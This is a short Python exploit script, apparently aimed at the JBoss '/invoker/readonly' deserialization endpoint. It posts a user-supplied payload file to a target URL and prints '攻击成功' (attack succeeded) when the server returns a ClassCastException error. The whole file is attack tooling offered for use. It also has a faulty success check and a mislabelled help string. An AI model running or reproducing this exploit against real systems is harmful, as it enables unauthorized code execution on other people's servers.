import sys
import requests
import argparse

if __name__ =='__main__':
    parse = argparse.ArgumentParser()
    parse.add_argument("url", type=str, help="URL with path to PMA")
    parse.add_argument("-f", "--file", type=str,required=True,help="输入上传文件名称")
    arguments = parse.parse_args()

    url=arguments.url
    filename=arguments.file

    f1=open(filename,'rb') #打开读文件

    req=requests.Session()
    #req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    resp=req.post(url+"/invoker/readonly",f1)
    if resp.status_code==500:
        if resp.text.find("java.lang.ClassCastException"):
            print("攻击成功")
        else:
            print("攻击失败")




